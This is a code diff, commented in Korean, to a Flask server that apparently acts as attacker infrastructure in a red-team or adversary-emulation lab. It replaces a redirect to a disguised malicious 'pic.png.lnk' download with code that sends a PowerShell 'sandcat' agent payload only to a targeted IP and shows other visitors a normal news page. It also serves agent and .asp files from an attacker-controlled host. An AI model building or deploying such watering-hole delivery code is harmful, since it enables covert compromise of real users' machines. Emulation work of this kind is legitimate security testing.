@@ -60,7 +60,6 @@ os.makedirs(WATERING_HOLE_DIR, exist_ok=True)
 # TTPs10 설정
 # ========================================
 TTPS10_TARGET = "192.168.56.200"
-LNK_FILE = os.path.join(AGENT_DIR, "pic.png.lnk")
 
 # 라우트 추가 (기존 라우트들과 함께)
 @app.route("/news/article/1")
@@ -69,23 +68,19 @@ def news_article():
     log_event(f"[NEWS_ACCESS] ip={client_ip}")
     
     if client_ip == TTPS10_TARGET:
-        log_event(f"[NEWS_TARGET_HIT] ip={client_ip} - Redirect to LNK")
-        return redirect(f"http://{ATTACKER_HOST}:{PORT}/download/malicious.lnk", code=302)
+        log_event(f"[NEWS_TARGET_HIT] ip={client_ip}")
+        # PowerShell 스크립트 반환
+        file_path = os.path.join(AGENT_DIR, "sandcat_ttps10.ps1")
+        if os.path.exists(file_path):
+            with open(file_path, 'r', encoding='utf-8') as f:
+                payload = f.read()
+            log_event(f"[TTPS10_PAYLOAD_SENT] ip={client_ip}")
+            return payload, 200, {'Content-Type': 'text/plain'}
+        else:
+            return "Agent not found", 404
     else:
+        # 다른 IP → 정상 뉴스 페이지
         return send_file(os.path.join(WATERING_HOLE_DIR, "ttps10_normal.html"))
-
-@app.route("/download/malicious.lnk")
-def download_lnk():
-    client_ip = get_client_ip()
-    log_event(f"[LNK_DOWNLOAD] ip={client_ip}")
-    
-    if not os.path.exists(LNK_FILE):
-        return "Not found", 404
-    
-    return send_file(LNK_FILE, 
-                     as_attachment=True,
-                     download_name='pic.png.lnk',
-                     mimetype='application/octet-stream')
                
 # ========================================
 
@@ -157,18 +152,22 @@ def login_trigger():
 @app.route("/agents/<path:filename>")
 def serve_agent(filename):
     client_ip = get_client_ip()
-
-    # (선택) allowlist 밖이면 ttps2 agent 제공 차단
+    
     if filename == TTPS2_AGENT and client_ip not in TARGET_IP_ALLOWLIST:
         log_event(f"[DENY] ip={client_ip} tried={filename}")
         return "Not found", 404
-
+    
     file_path = os.path.join(AGENT_DIR, filename)
     if not os.path.exists(file_path):
         log_event(f"[FILE NOT FOUND] ip={client_ip} path={file_path}")
         return "File not found", 404
-
+    
     log_event(f"[AGENT_DOWNLOAD] ip={client_ip} file={filename}")
+    
+    # ASP 파일은 text/plain으로 제공
+    if filename.endswith('.asp'):
+        return send_file(file_path, mimetype='text/plain')
+    
     return send_file(file_path, as_attachment=True)
 
 @app.route("/upload", methods=["POST"])
